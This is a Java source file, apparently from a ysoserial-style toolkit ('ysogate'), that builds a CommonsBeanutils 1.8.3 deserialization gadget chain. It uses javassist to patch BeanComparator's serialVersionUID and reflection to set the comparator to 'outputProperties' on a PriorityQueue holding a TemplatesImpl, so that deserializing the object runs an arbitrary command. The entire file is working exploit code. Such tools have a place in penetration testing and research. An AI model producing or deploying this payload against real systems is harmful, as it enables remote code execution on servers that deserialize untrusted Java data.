package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.config.Config;
import com.h2tg.ysogate.utils.*;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;


import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
public class CommonsBeanutils1183NOCC implements CommandObjectPayload<Object>
{

	@Override
	public Object getObject(String command) throws Exception {
		final Object template = Gadgets.createTemplatesImpl(command);

		CtClass ctClass = Config.POOL.get("org.apache.commons.beanutils.BeanComparator");
		CtClassUtils.insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");

		Class beanCompareClazz;
		try {
			beanCompareClazz = ctClass.toClass();
		} catch (Exception e) {
			beanCompareClazz = Class.forName("org.apache.commons.beanutils.BeanComparator");
		}


		BeanComparator              comparator       = (BeanComparator) beanCompareClazz.newInstance();
		final PriorityQueue<Object> queue            = new PriorityQueue<Object>(2, comparator);
		queue.add("1");
		queue.add("1");

		// switch method called by comparator
		Reflections.setFieldValue(comparator, "property", "outputProperties");
		Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);
		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});

		return queue;
	}
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils1183NOCC.class, args);
	}
}
